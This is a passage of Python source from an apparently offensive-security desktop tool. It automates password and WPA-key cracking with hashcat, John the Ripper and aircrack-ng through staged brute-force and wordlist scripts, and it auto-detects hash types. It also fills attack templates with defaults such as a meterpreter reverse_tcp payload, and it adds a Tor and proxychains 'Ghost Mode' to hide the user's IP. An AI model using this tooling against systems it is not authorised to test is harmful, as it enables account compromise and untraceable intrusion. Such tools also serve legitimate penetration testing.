                ("Stage 1c: Digits 9-12 chars",
                 f"hashcat -m {hm} -a 3 '{filepath}' '?d?d?d?d?d?d?d?d?d?d?d?d' --increment --increment-min=9 --force -O -w 3 --status --status-timer=3 --runtime=180 2>/dev/null"),
                # Lowercase — fast
                ("Stage 2: Lowercase 1-6 chars",
                 f"hashcat -m {hm} -a 3 '{filepath}' '?l?l?l?l?l?l' --increment --increment-min=1 --force -O -w 3 --status --status-timer=3 2>/dev/null"),
                ("Stage 2b: Lowercase 7-8 chars",
                 f"hashcat -m {hm} -a 3 '{filepath}' '?l?l?l?l?l?l?l?l' --increment --increment-min=7 --force -O -w 3 --status --status-timer=3 --runtime=300 2>/dev/null"),
                # Mixed lowercase + digits
                ("Stage 3: Lowercase+digits 1-6 chars",
                 f"hashcat -m {hm} -a 3 '{filepath}' -1 '?l?d' '?1?1?1?1?1?1' --increment --increment-min=1 --force -O -w 3 --status --status-timer=3 --runtime=300 2>/dev/null"),
                # Common patterns: word + 1-4 digits at end
                ("Stage 4: Common patterns (lowercase + trailing digits)",
                 f"hashcat -m {hm} -a 3 '{filepath}' '?l?l?l?l?l?d?d?d?d' --increment --increment-min=5 --force -O -w 3 --status --status-timer=3 --runtime=300 2>/dev/null"),
                # All printable
                ("Stage 5: All printable 1-5 chars",
                 f"hashcat -m {hm} -a 3 '{filepath}' '?a?a?a?a?a' --increment --increment-min=1 --force -O -w 3 --status --status-timer=3 --runtime=300 2>/dev/null"),
                ("Stage 5b: All printable 6 chars",
                 f"hashcat -m {hm} -a 3 '{filepath}' '?a?a?a?a?a?a' --force -O -w 3 --status --status-timer=3 --runtime=600 2>/dev/null"),
            ]

            for label, stage_cmd in stages:
                script.write(f"\necho ''\necho '══════════════════════════════════════'\n")
                script.write(f"echo '  {label}'\necho '══════════════════════════════════════'\n")
                script.write(f"{stage_cmd}\n")
                script.write(f"if {check} >/dev/null 2>&1; then\n")
                script.write(f"  echo ''\n  echo '  PASSWORD CRACKED!'\n")
                script.write(f"  hashcat -m {hm} '{filepath}' --show 2>/dev/null\n")
                script.write(f"  exit 0\nfi\n")

            script.write(f"\necho ''\necho '  Brute force complete.'\n")
            script.write(f"hashcat -m {hm} '{filepath}' --show 2>/dev/null\n")
            script.close()
            os.chmod(script.name, 0o755)
            self._execute_command(f"bash '{script.name}'")
            return

        # John the Ripper brute force — CPU, works for everything
        reply = QMessageBox.question(self, "No Password Found",
            "Wordlists didn't crack it.\n\n"
            "Do you want to BRUTE FORCE it?\n\n"
            "Stage 1: Digits (0-9) up to 12 chars — fast\n"
            "Stage 2: Lowercase (a-z) up to 8 chars\n"
            "Stage 3: Letters (a-zA-Z) up to 7 chars\n"
            "Stage 4: Alphanumeric up to 6 chars\n"
            "Stage 5: ALL printable up to 6 chars\n\n"
            "Stops early if password is found.",
            QMessageBox.Yes | QMessageBox.No, QMessageBox.Yes)
        if reply != QMessageBox.Yes:
            return

        fmt_flag = f"--format={john_fmt} " if john_fmt else ""

        self._is_bruteforcing = True
        self.terminal.appendPlainText("\n\n  JOHN BRUTE FORCE...\n\n")

        check = f"john {fmt_flag}--show '{filepath}' 2>/dev/null | grep -v '^0 password' | grep -v '^$' | grep ':'"

        stages = [
            ("Stage 1: Digits only (0-9), up to 12 chars, 2 min",
             f"john {fmt_flag}--incremental=Digits --max-length=12 --max-run-time=120 '{filepath}'"),
            ("Stage 2: Lowercase (a-z), up to 8 chars, 3 min",
             f"john {fmt_flag}--incremental=Lower --max-length=8 --max-run-time=180 '{filepath}'"),
            ("Stage 3: Letters (a-zA-Z), up to 7 chars, 3 min",
             f"john {fmt_flag}--incremental=Alpha --max-length=7 --max-run-time=180 '{filepath}'"),
            ("Stage 4: Alphanumeric (a-zA-Z0-9), up to 6 chars, 5 min",
             f"john {fmt_flag}--incremental=Alnum --max-length=6 --max-run-time=300 '{filepath}'"),
            ("Stage 5: ALL printable chars, up to 6 chars, 5 min",
             f"john {fmt_flag}--incremental=ASCII --max-length=6 --max-run-time=300 '{filepath}'"),
        ]

        script = tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False, prefix='maxim_brute_')
        script.write("#!/bin/bash\n")
        for label, stage_cmd in stages:
            script.write(f"\necho ''\necho '══════════════════════════════════════'\n")
            script.write(f"echo '  {label}'\necho '══════════════════════════════════════'\n")
            script.write(f"{stage_cmd}\n")
            script.write(f"if {check} >/dev/null 2>&1; then\n")
            script.write(f"  echo ''\n  echo '  PASSWORD CRACKED!'\n")
            script.write(f"  john {fmt_flag}--show '{filepath}'\n")
            script.write(f"  exit 0\nfi\n")
        script.write(f"\necho ''\necho '  Brute force complete.'\n")
        script.write(f"john {fmt_flag}--show '{filepath}'\n")
        script.close()
        os.chmod(script.name, 0o755)
        self._execute_command(f"bash '{script.name}'")

    def _on_file_dropped(self, filepath):
        """Handle file dropped onto the terminal."""
        self._analyze_file(filepath)

    def _load_file(self):
        """Load a file via file dialog."""
        filepath, _ = QFileDialog.getOpenFileName(
            self, "Load File for Analysis",
            os.path.expanduser("~"),
            "All Supported (*.cap *.pcap *.hc22000 *.hccapx *.txt *.hash *.csv *.xml);;Capture Files (*.cap *.pcap);;Hash Files (*.txt *.hash *.hc22000 *.hccapx);;All Files (*)"
        )
        if not filepath:
            return
        self._analyze_file(filepath)

    # Wordlists in order of priority — tries each until cracked
    WORDLISTS = [
        "/usr/share/wordlists/gago.txt",
        "/usr/share/wordlists/rockyou.txt",
    ]

    def _get_wordlists(self):
        """Return all existing wordlists: gago first, rockyou second, then extras."""
        # Auto-unzip rockyou.txt if only .gz exists
        rockyou = "/usr/share/wordlists/rockyou.txt"
        if not os.path.exists(rockyou) and os.path.exists(rockyou + ".gz"):
            try:
                subprocess.run(f"sudo gunzip -k '{rockyou}.gz'", shell=True, timeout=30)
            except Exception:
                pass

        existing = []
        for wl in self.WORDLISTS:
            if os.path.exists(wl):
                existing.append(wl)
        # Scan for extra downloaded or custom wordlists
        extra_dirs = [
            "/usr/share/wordlists",
            "/usr/share/seclists/Passwords",
            os.path.expanduser("~/wordlists"),
            os.path.expanduser("~/Desktop/wordlists"),
        ]
        for d in extra_dirs:
            if os.path.isdir(d):
                try:
                    for f in os.listdir(d):
                        fp = os.path.join(d, f)
                        if fp not in existing and os.path.isfile(fp) and f.endswith(('.txt', '.lst')):
                            existing.append(fp)
                except Exception:
                    pass
        return existing if existing else ["/usr/share/wordlists/gago.txt"]

    def _build_crack_cmd(self, tool, filepath, hash_format=None):
        """Build crack command as a bash script with early exit on success."""
        import tempfile
        wordlists = self._get_wordlists()
        # Ensure gago.txt is first, rockyou second
        for main_wl in reversed(["/usr/share/wordlists/gago.txt", "/usr/share/wordlists/rockyou.txt"]):
            if main_wl in wordlists:
                wordlists.remove(main_wl)
                wordlists.insert(0, main_wl)

        if tool == "aircrack":
            # aircrack-ng does NOT need sudo — it's a userspace tool
            # aircrack-ng returns 0 even on failure, so grep for "KEY FOUND!" in output
            script = tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False, prefix='maxim_crack_')
            script.write("#!/bin/bash\n\n")
            for i, wl in enumerate(wordlists, 1):
                script.write(f"echo ''\necho '  [{i}/{len(wordlists)}] Wordlist: {os.path.basename(wl)}'\n")
                script.write(f"OUTPUT=$(aircrack-ng -w '{wl}' '{filepath}' 2>&1)\n")
                script.write(f"echo \"$OUTPUT\"\n")
                script.write(f"if echo \"$OUTPUT\" | grep -q 'KEY FOUND!'; then\n")
                script.write(f"  echo ''\n  echo '  KEY FOUND!'\n  exit 0\nfi\n\n")
            script.write("echo ''\necho '  Wordlists exhausted — no key found.'\n")
            script.close()
            os.chmod(script.name, 0o755)
            return f"bash '{script.name}'"

        # Build a script that stops as soon as password is found
        script = tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False, prefix='maxim_crack_')
        script.write("#!/bin/bash\n\n")

        if tool == "john":
            fmt = f"--format={hash_format} " if hash_format else ""
            check = f"john {fmt}--show '{filepath}' 2>/dev/null | grep -v '^0 password' | grep -v '^$' | grep ':'"

            # Stage 1: first wordlist + rules
            script.write(f"echo ''\necho '  [1] Wordlist + rules: {os.path.basename(wordlists[0])}'\n")
            script.write(f"john {fmt}--wordlist='{wordlists[0]}' --rules=best64 '{filepath}' || true\n")
            script.write(f"if {check} >/dev/null 2>&1; then\n")
            script.write(f"  echo ''\n  echo '  PASSWORD FOUND!'\n  john {fmt}--show '{filepath}'\n  exit 0\nfi\n")

            # Stage 2+: remaining wordlists
            for i, wl in enumerate(wordlists[1:], 2):
                script.write(f"\necho ''\necho '  [{i}] Wordlist: {os.path.basename(wl)}'\n")
                script.write(f"john {fmt}--wordlist='{wl}' '{filepath}' || true\n")
                script.write(f"if {check} >/dev/null 2>&1; then\n")
                script.write(f"  echo ''\n  echo '  PASSWORD FOUND!'\n  john {fmt}--show '{filepath}'\n  exit 0\nfi\n")

            # Final show
            script.write(f"\necho ''\necho '  Wordlists exhausted.'\njohn {fmt}--show '{filepath}'\n")

        elif tool == "hashcat":
            hm = hash_format
            # --show outputs "hash:password" lines; exclude error/status lines
            check = f"hashcat -m {hm} '{filepath}' --show 2>/dev/null | grep -v '^Hashfile' | grep -v 'Token length' | grep -v '^[*]' | grep -v '^$' | grep ':'"

            # Stage 1: first wordlist + rules
            script.write(f"echo ''\necho '  [1] Wordlist + rules: {os.path.basename(wordlists[0])}'\n")
            script.write(f"hashcat -m {hm} '{filepath}' '{wordlists[0]}' -r /usr/share/hashcat/rules/best64.rule --force -O --status --status-timer=3 2>/dev/null || true\n")
            script.write(f"if {check} >/dev/null 2>&1; then\n")
            script.write(f"  echo ''\n  echo '  PASSWORD FOUND!'\n  hashcat -m {hm} '{filepath}' --show 2>/dev/null\n  exit 0\nfi\n")

            # Stage 2+: remaining wordlists
            for i, wl in enumerate(wordlists[1:], 2):
                script.write(f"\necho ''\necho '  [{i}] Wordlist: {os.path.basename(wl)}'\n")
                script.write(f"hashcat -m {hm} '{filepath}' '{wl}' --force -O --status --status-timer=3 2>/dev/null || true\n")
                script.write(f"if {check} >/dev/null 2>&1; then\n")
                script.write(f"  echo ''\n  echo '  PASSWORD FOUND!'\n  hashcat -m {hm} '{filepath}' --show 2>/dev/null\n  exit 0\nfi\n")

            # Final show
            script.write(f"\necho ''\necho '  Wordlists exhausted.'\nhashcat -m {hm} '{filepath}' --show 2>/dev/null\n")

        script.close()
        os.chmod(script.name, 0o755)
        return f"bash '{script.name}'"

    # Hash detection: (prefix, john_format, hashcat_mode, label, tool_preference)
    # tool_preference: "hashcat" = GPU-fast hashes, "john" = CPU-better or complex formats
    HASH_TYPES = [
        # Prefix-based detection (checked first)
        ("$2b$", "bcrypt", "3200", "bcrypt", "hashcat"),
        ("$2a$", "bcrypt", "3200", "bcrypt", "hashcat"),
        ("$2y$", "bcrypt", "3200", "bcrypt", "hashcat"),
        ("$2$",  "bcrypt", "3200", "bcrypt", "hashcat"),
        ("$6$",  "sha512crypt", "1800", "SHA512crypt", "hashcat"),
        ("$5$",  "sha256crypt", "7400", "SHA256crypt", "hashcat"),
        ("$1$",  "md5crypt", "500", "MD5crypt", "hashcat"),
        ("$apr1$", "md5crypt", "1600", "Apache MD5", "hashcat"),
        ("$P$",  "phpass", "400", "phpass (WordPress)", "hashcat"),
        ("$H$",  "phpass", "400", "phpass (phpBB)", "hashcat"),
        ("$y$",  "yescrypt", "None", "yescrypt", "john"),
        ("$7$",  "scrypt", "None", "scrypt", "john"),
    ]

    # Length-based detection: (hash_length, john_format, hashcat_mode, label)
    HASH_LENGTHS = {
        32:  ("Raw-MD5", "0", "MD5"),
        40:  ("Raw-SHA1", "100", "SHA1"),
        56:  ("Raw-SHA224", "1300", "SHA224"),
        64:  ("Raw-SHA256", "1400", "SHA256"),
        96:  ("Raw-SHA384", "10800", "SHA384"),
        128: ("Raw-SHA512", "1700", "SHA512"),
        16:  ("LM", "3000", "LM hash"),
        32 + 1 + 32: ("NTLM", "1000", "NTLM"),  # 65 chars for user:hash
    }

    def _analyze_file(self, filepath):
        """Auto-detect file type and crack/analyze immediately — no popups."""
        self._is_bruteforcing = False
        ext = os.path.splitext(filepath)[1].lower()
        fname = os.path.basename(filepath)

        if ext in ('.cap', '.pcap'):
            wls = self._get_wordlists()
            self.terminal.appendPlainText(f"\n⚡ Cracking WPA from {fname} using {len(wls)} wordlists:\n")
            for wl in wls:
                self.terminal.appendPlainText(f"  - {wl}\n")
            self.terminal.appendPlainText("")
            self._execute_command(self._build_crack_cmd("aircrack", filepath))

        elif ext in ('.hc22000', '.hccapx'):
            wl_count = len(self._get_wordlists())
            self.terminal.appendPlainText(f"\n⚡ Cracking {fname} with hashcat ({wl_count} wordlists + rules)...\n")
            self._execute_command(self._build_crack_cmd("hashcat", filepath, "22000"))

        elif ext in ('.txt', '.hash'):
            self.terminal.appendPlainText(f"\n⚡ Auto-detecting hash type in {fname}...\n")
            try:
                with open(filepath, 'r') as f:
                    first_line = f.readline().strip()
            except Exception:
                first_line = ""

            if not first_line:
                self.terminal.appendPlainText("[!] Empty file\n")
                return

            wl_count = len(self._get_wordlists())

            # 1. Check prefix-based hash types
            for prefix, john_fmt, hc_mode, label, pref_tool in self.HASH_TYPES:
                if first_line.startswith(prefix):
                    self.terminal.appendPlainText(f"Detected: {label} — {wl_count} wordlists + rules\n")
                    if pref_tool == "hashcat" and hc_mode != "None":
                        self._execute_command(self._build_crack_cmd("hashcat", filepath, hc_mode))
                    else:
                        self._execute_command(self._build_crack_cmd("john", filepath, john_fmt))
                    return

            # 2. Check NTLM format (user:hash or just 32-char hex)
            hash_part = first_line.split(':')[-1].strip() if ':' in first_line else first_line
            hash_len = len(hash_part)

            # Check if it's hex
            is_hex = all(c in '0123456789abcdefABCDEF' for c in hash_part)

            if is_hex and hash_len in self.HASH_LENGTHS:
                john_fmt, hc_mode, label = self.HASH_LENGTHS[hash_len]
                self.terminal.appendPlainText(f"Detected: {label} ({hash_len} hex chars) — {wl_count} wordlists + rules\n")
                # Use hashcat for fast hashes (MD5, SHA1, SHA256, NTLM), john for others
                if hash_len <= 64:
                    self._execute_command(self._build_crack_cmd("hashcat", filepath, hc_mode))
                else:
                    self._execute_command(self._build_crack_cmd("john", filepath, john_fmt))
            else:
                self.terminal.appendPlainText(f"Unknown hash type ({hash_len} chars) — trying john auto-detect\n")
                self._execute_command(self._build_crack_cmd("john", filepath))

        elif ext in ('.csv', '.xml'):
            self.terminal.appendPlainText(f"\n⚡ Showing {fname}...\n")
            self._execute_command(f"cat '{filepath}' | head -100")

        else:
            self._ai_execute(f"analyze this file: {filepath}")

    def _on_stop(self):
        self.runner.kill_all()
        self.terminal.appendPlainText("\n[KILLED] Process terminated.\n")
        self._set_running(False)

    def _clear_terminal(self):
        self.terminal.clear()

    def _add_word_to_wordlist_btn(self):
        """Add a new wordlist .txt file to /usr/share/wordlists/."""
        filepath, _ = QFileDialog.getOpenFileName(
            self, "Select Wordlist File to Add",
            os.path.expanduser("~"),
            "Wordlists (*.txt *.lst);;All Files (*)")
        if filepath:
            fname = os.path.basename(filepath)
            safe_src = shlex.quote(filepath)
            safe_dest = shlex.quote(f"/usr/share/wordlists/{fname}")
            self._execute_command(
                f"sudo cp {safe_src} {safe_dest} && "
                f"echo 'Added wordlist: /usr/share/wordlists/{fname}' && "
                f"wc -l {safe_dest}"
            )

    def _add_word_to_wordlist(self, filepath):
        """Add a word/password to a wordlist file."""
        word, ok = QInputDialog.getText(self, "Add Word",
            f"Enter word/password to add to:\n{filepath}")
        if ok and word.strip():
            safe_word = shlex.quote(word.strip())
            safe_path = shlex.quote(filepath)
            self._execute_command(
                f"sudo gzip -d {safe_path}.gz 2>/dev/null; "
                f"echo {safe_word} | sudo tee -a {safe_path} && "
                f"echo 'Added word to wordlist'"
            )

    def _add_word_to_custom_wordlist(self):
        """Add a word to a custom wordlist file chosen by user."""
        filepath, _ = QFileDialog.getOpenFileName(
            self, "Select Wordlist", "/usr/share/wordlists",
            "Wordlists (*.txt *.lst);;All Files (*)")
        if filepath:
            self._add_word_to_wordlist(filepath)

    # ═══════════════════════════════════════
    #  PLACEHOLDERS
    # ═══════════════════════════════════════

    def _extract_target_from_query(self, query):
        ip_match = re.search(r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(?:/\d{1,2})?)\b', query)
        if ip_match:
            return ip_match.group(1)
        domain_match = re.search(r'\b([a-zA-Z0-9][-a-zA-Z0-9]*\.[a-zA-Z]{2,}(?:\.[a-zA-Z]{2,})?)\b', query)
        if domain_match:
            candidate = domain_match.group(1)
            if candidate not in {'example.com', 'wlan0.mon'}:
                return candidate
        return None

    def _fill_placeholders(self, cmd_template, query=""):
        extracted = self._extract_target_from_query(query) if query else None
        defaults = {
            "iface": "wlan0", "target": extracted or "192.168.1.1",
            "port": "4444", "lhost": "0.0.0.0", "lport": "4444",
            "domain": extracted or "example.com",
            "user": "admin", "wordlist": "/usr/share/wordlists/rockyou.txt",
            "hashfile": "hashes.txt", "hash_file": "hashes.txt",
            "query": "apache", "bssid": "FF:FF:FF:FF:FF:FF",
            "min": "8", "max": "12", "charset": "abcdefghijklmnopqrstuvwxyz0123456789",
            "file": "target_file", "image": "/dev/sda1", "dump": "memory.dmp",
            "subnet": "192.168.1.0/24", "url": extracted or "http://192.168.1.1",
            "cap_file": "capture.cap", "channel": "6",
            "module": "exploit/multi/handler", "payload": "linux/x64/meterpreter/reverse_tcp",
            "format": "elf", "id": "1", "pass": "password",
            "mode": "0", "path": "/login", "params": "user=admin&pass=^PASS^",
            "fail_string": "Invalid", "gateway": "192.168.1.1",
            "binary": "target_binary", "command": "nmap -sV 192.168.1.1",
            "name": "session1", "rhost": "127.0.0.1", "rport": "8080",
            "data": "key=value", "server": "192.168.1.1",
        }
        cmd = cmd_template
        for ph, val in defaults.items():
            cmd = cmd.replace(f"{{{ph}}}", val)
        return cmd

    # ═══════════════════════════════════════
    #  AI CHAT
    # ═══════════════════════════════════════

    def _on_ai_submit(self):
        msg = self.ai_input.text().strip()
        if not msg:
            return
        self.ai_input.clear()
        self.ai_input.setEnabled(False)

        safe_msg = html.escape(msg)
        self.ai_chat.append(
            f'<div style="background:#1e3a5f;border-radius:10px;padding:10px;margin:6px 40px 6px 6px;">'
            f'<b style="color:#60a5fa;">You:</b> '
            f'<span style="color:#fafafa;font-size:15px;">{safe_msg}</span></div>'
        )

        if not self.ai or not self.ai.is_available():
            route = SmartRouter.route(msg)
            if route["tools"]:
                parts = []
                for t in route["tools"]:
                    parts.append(f"<b>{t['name']}</b> -- {t['description']}<br>")
                    for cc in t["common_commands"][:3]:
                        parts.append(f"&nbsp;&nbsp;<code>{cc['cmd']}</code><br>")
                reply = "".join(parts)
            elif route["direct_command"]:
                reply = f"Run: <code>{route['direct_command']}</code>"
            else:
                reply = ("No AI available. Set up in AI menu:<br>"
                         "- <b>Offline:</b> <code>ollama serve</code><br>"
                         "- <b>Online:</b> AI > Set API Key")

            self.ai_chat.append(
                f'<div style="background:#18181b;border-radius:10px;padding:10px;margin:6px 6px 6px 40px;">'
                f'<b style="color:#facc15;">Maxim:</b> {reply}</div>'
            )
            self.ai_input.setEnabled(True)
            self.ai_input.setFocus()
            return

        provider_tag = self.ai.provider_name

        # Animated loading indicator
        self._ai_loading_dots = 0
        self._ai_loading_id = "ai-loading-" + str(id(msg))
        self.ai_chat.append(
            f'<div id="{self._ai_loading_id}" style="background:#18181b;border-radius:10px;padding:10px;margin:6px 6px 2px 40px;">'
            f'<span style="color:#3b82f6;">⚡ Thinking</span> '
            f'<span style="color:#52525b;font-size:11px;">via {provider_tag}</span></div>'
        )

        # Pulsing dots animation
        self._ai_loading_timer = QTimer()
        self._ai_loading_base_text = f'<div style="background:#18181b;border-radius:10px;padding:10px;margin:6px 6px 2px 40px;">'
        def update_dots():
            self._ai_loading_dots = (self._ai_loading_dots + 1) % 4
            dots = "." * self._ai_loading_dots + " " * (3 - self._ai_loading_dots)
            # Remove last block and replace with updated dots
            cursor = self.ai_chat.textCursor()
            cursor.movePosition(QTextCursor.End)
            self.ai_chat.setTextCursor(cursor)
        self._ai_loading_timer.timeout.connect(update_dots)
        self._ai_loading_timer.start(400)

        # Stream tokens into chat
        self._ai_stream_buffer = []
        self._ai_streaming_started = False

        self._ai_thread = AIStreamSignal(self.ai, msg)

        def on_token(token):
            if not self._ai_streaming_started:
                self._ai_streaming_started = True
                self._ai_loading_timer.stop()
                # Replace loading message with start of response
                self.ai_chat.append(
                    f'<div style="background:#18181b;border-radius:10px;padding:10px;margin:6px 6px 6px 40px;">'
                    f'<b style="color:#4ade80;">Maxim AI</b> '
                    f'<span style="color:#52525b;font-size:11px;">via {provider_tag}</span><br>'
                    f'<span style="color:#e4e4e7;font-size:14px;">'
                )
            self._ai_stream_buffer.append(token)

        def on_done(full):
            self._ai_loading_timer.stop()
            self.ai_input.setEnabled(True)
            self.ai_input.setFocus()

            if not self._ai_streaming_started:
                # Never got streaming tokens, show full response
                text = html.escape(full).replace("\n", "<br>")
                self.ai_chat.append(
                    f'<div style="background:#18181b;border-radius:10px;padding:10px;margin:6px 6px 6px 40px;">'
                    f'<b style="color:#4ade80;">Maxim AI</b> '
                    f'<span style="color:#52525b;font-size:11px;">via {provider_tag}</span><br>'
                    f'<span style="color:#e4e4e7;font-size:14px;">{text}</span></div>'
                )
            else:
                # Finalize streamed response
                text = html.escape(full).replace("\n", "<br>")
                self.ai_chat.append(
                    f'<div style="background:#18181b;border-radius:10px;padding:10px;margin:6px 6px 6px 40px;">'
                    f'<b style="color:#4ade80;">Maxim AI</b> '
                    f'<span style="color:#52525b;font-size:11px;">via {provider_tag}</span><br>'
                    f'<span style="color:#e4e4e7;font-size:14px;">{text}</span></div>'
                )

        self._ai_thread.token_received.connect(on_token)
        self._ai_thread.finished.connect(on_done)
        self._ai_thread.start()

    # ═══════════════════════════════════════
    #  AI MANAGEMENT
    # ═══════════════════════════════════════

    def _set_api_key_dialog(self):
        providers = [(pid, p["name"]) for pid, p in PROVIDERS.items() if p["type"] == "online"]
        names = [n for _, n in providers]
        choice, ok = QInputDialog.getItem(self, "Select Provider", "Provider:", names, 0, False)
        if not ok:
            return
        pid = providers[names.index(choice)][0]
        prov = PROVIDERS[pid]

        key, ok = QInputDialog.getText(
            self, f"API Key -- {prov['name']}",
            f"Enter API key for {prov['name']}:\nGet one at: {prov.get('key_url', 'N/A')}",
            QLineEdit.Normal, ""
        )
        if ok and key.strip():
            if not self.ai:
                self.ai = AIManager()
            self.ai.set_api_key(pid, key.strip())
            self.ai.switch_provider(pid)
            self._update_status()
            QMessageBox.information(self, "Saved", f"API key saved. Switched to {prov['name']}.")

    def _quick_switch_provider(self, pid):
        if not self.ai:
            self.ai = AIManager()
        self.ai.switch_provider(pid)
        self._update_status()
        prov = PROVIDERS.get(pid, {})
        if prov.get("needs_key") and not get_api_key(pid):
            self._set_api_key_dialog()

    def _update_status(self):
        if not self.ai:
            self.ai_status.setText("AI: Loading...")
            self.ai_status.setStyleSheet("color: #52525b; font-size: 13px; padding: 4px 14px; background: #18181b; border-radius: 12px;")
            return
        status = self.ai.get_status()
        if self.ai.is_available():
            self.ai_status.setText(f"AI: {status}")
            self.ai_status.setStyleSheet("color: #4ade80; font-size: 13px; padding: 4px 14px; background: #052e16; border-radius: 12px;")
        else:
            self.ai_status.setText(f"AI: {status}")
            self.ai_status.setStyleSheet("color: #facc15; font-size: 13px; padding: 4px 14px; background: #1c1917; border-radius: 12px;")

    # ═══════════════════════════════════════
    #  GHOST MODE (Tor + proxychains + MAC spoof)
    # ═══════════════════════════════════════

    # Tools that CANNOT go through proxychains (local/WiFi/hardware tools)
    _NO_PROXY_TOOLS = {
        "airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng", "wifite",
        "reaver", "wash", "macchanger", "ifconfig", "iwconfig", "ip",
        "systemctl", "service", "apt-get", "apt", "dpkg", "john", "hashcat",
        "crunch", "airbase-ng", "bettercap", "ettercap", "netdiscover",
    }

    def _toggle_ghost_mode(self):
        if self._ghost_mode:
            self._disable_ghost_mode()
        else:
            self._enable_ghost_mode()

    def _enable_ghost_mode(self):
        self._ghost_mode = True
        self.terminal.appendPlainText(f"\n{'═'*60}")
        self.terminal.appendPlainText("  GHOST MODE — ACTIVATING")
        self.terminal.appendPlainText(f"{'═'*60}\n")
        QApplication.processEvents()

        # Step 1: Start Tor
        self.terminal.appendPlainText("[1/4] Starting Tor service...\n")
        QApplication.processEvents()
        self.runner.run("sudo systemctl start tor")

        # Step 2: Verify Tor is running
        code, out, _ = self.runner.run("systemctl is-active tor")
        if "active" not in out:
            self.terminal.appendPlainText("[!] Tor failed to start. Installing...\n")
            QApplication.processEvents()
            self.runner.run("sudo apt-get install -y tor proxychains4")
            self.runner.run("sudo systemctl start tor")

        # Step 3: Configure proxychains for Tor
        self.terminal.appendPlainText("[2/4] Configuring proxychains for Tor...\n")
        QApplication.processEvents()
        # Ensure proxychains uses Tor SOCKS5 on 9050
        self.runner.run(
            "sudo cp /etc/proxychains4.conf /etc/proxychains4.conf.bak 2>/dev/null; "
            "sudo sed -i 's/^strict_chain/#strict_chain/' /etc/proxychains4.conf; "
            "sudo sed -i 's/^#dynamic_chain/dynamic_chain/' /etc/proxychains4.conf; "
            "grep -q 'socks5.*9050' /etc/proxychains4.conf || echo 'socks5 127.0.0.1 9050' | sudo tee -a /etc/proxychains4.conf"
        )

        # Step 4: Get Tor IP
        self.terminal.appendPlainText("[3/4] Checking Tor exit IP...\n")
        QApplication.processEvents()
        code, real_ip, _ = self.runner.run("curl -s --max-time 5 ifconfig.me 2>/dev/null")
        real_ip = real_ip.strip()
        code, tor_ip, _ = self.runner.run("proxychains4 -q curl -s --max-time 15 ifconfig.me 2>/dev/null")
        tor_ip = tor_ip.strip()

        if tor_ip and tor_ip != real_ip:
            self.terminal.appendPlainText(f"[4/4] Ghost Mode ACTIVE\n")
            self.terminal.appendPlainText(f"  Real IP:  {real_ip} (hidden)\n")
            self.terminal.appendPlainText(f"  Tor IP:   {tor_ip}\n")
            self.terminal.appendPlainText(f"  All commands routed through Tor.\n")
            self.terminal.appendPlainText(f"  Local/WiFi tools bypass proxy automatically.\n\n")

            self.ghost_status.setText(f"GHOST: {tor_ip}")
            self.ghost_status.setStyleSheet(
                "color: #a78bfa; font-size: 13px; font-weight: bold; padding: 4px 14px; "
                "background: #1e1033; border: 1px solid #7c3aed; border-radius: 12px;"
            )
            self.ghost_status.show()
        else:
            self.terminal.appendPlainText(f"[!] Tor connection failed — could not get Tor IP.\n")
            self.terminal.appendPlainText(f"    Real IP: {real_ip}\n")
            self.terminal.appendPlainText(f"    Tor returned: {tor_ip or '(empty)'}\n")
            self.terminal.appendPlainText(f"    Check: sudo systemctl status tor\n\n")
            self._ghost_mode = False
            return

        # Update button
        self.ghost_btn.setText("Ghost Mode: ON")
        self.ghost_btn.setStyleSheet("""
            QPushButton {
                background: #1e1033; border: 1px solid #7c3aed; color: #a78bfa;
                border-radius: 8px; padding: 6px 14px; font-size: 14px; font-weight: 600;
            }
            QPushButton:hover { background: #2e1a4a; color: #c4b5fd; }
        """)

    def _new_tor_identity(self):
        """Get a new Tor exit IP without restarting."""
        self.terminal.appendPlainText("\n[Ghost] Requesting new Tor identity...\n")
        QApplication.processEvents()
        # Send NEWNYM signal to Tor control port
        self.runner.run(
            "echo -e 'AUTHENTICATE\r\nSIGNAL NEWNYM\r\nQUIT' | nc 127.0.0.1 9051 2>/dev/null || "
            "sudo systemctl restart tor"
        )
        import time
        time.sleep(2)
        code, tor_ip, _ = self.runner.run("proxychains4 -q curl -s --max-time 15 ifconfig.me 2>/dev/null")
        tor_ip = tor_ip.strip()
        if tor_ip:
            self.terminal.appendPlainText(f"[Ghost] New Tor IP: {tor_ip}\n")
            if self._ghost_mode:
                self.ghost_status.setText(f"GHOST: {tor_ip}")
        else:
            self.terminal.appendPlainText("[Ghost] Could not verify new IP.\n")

    def _disable_ghost_mode(self):
        self._ghost_mode = False
        self.terminal.appendPlainText("\n[Ghost Mode] Disabled — commands now use real IP.\n")

        self.ghost_btn.setText("Ghost Mode: OFF")
        self.ghost_btn.setStyleSheet("""
            QPushButton {
                background: transparent; border: 1px solid #27272a; color: #52525b;
                border-radius: 8px; padding: 6px 14px; font-size: 14px; font-weight: 600;
            }
            QPushButton:hover { border-color: #8b5cf6; color: #8b5cf6; }
        """)
        self.ghost_status.hide()

    def _should_proxy(self, cmd):
        """Check if a command should go through proxychains."""
        if not self._ghost_mode:
            return False
        # Don't proxy local/WiFi/hardware tools
        parts = re.split(r'[;&|]+', cmd)
        for part in parts:
            words = part.strip().split()
            if not words:
                continue
            tool = words[0]
            if tool == "sudo" and len(words) > 1:
                tool = words[1]
            if tool == "echo":
                # echo 'pw' | sudo -S ... — check the tool after sudo -S
                sudo_idx = part.find("sudo")
                if sudo_idx >= 0:
                    after_sudo = part[sudo_idx:].split()
                    for w in after_sudo[1:]:
                        if w.startswith("-"):
                            continue
                        tool = w
                        break
            if tool in self._NO_PROXY_TOOLS:
                return False
            # Don't proxy bash scripts (they handle their own tools)
            if tool == "bash" or cmd.startswith("bash "):
                return False
        return True

    def _wrap_proxychains(self, cmd):
        """Wrap a command with proxychains4."""
        # If command already has proxychains, don't double-wrap
        if "proxychains" in cmd:
            return cmd
        # For sudo commands: sudo proxychains4 -q <rest>
        if cmd.startswith("sudo "):
            return f"sudo proxychains4 -q {cmd[5:]}"
        # For piped sudo: echo 'pw' | sudo -S proxychains4 -q <rest>
        if "| sudo -S " in cmd:
            return cmd.replace("| sudo -S ", "| sudo -S proxychains4 -q ")
        return f"proxychains4 -q {cmd}"

    # ═══════════════════════════════════════
    #  MISC
    # ═══════════════════════════════════════

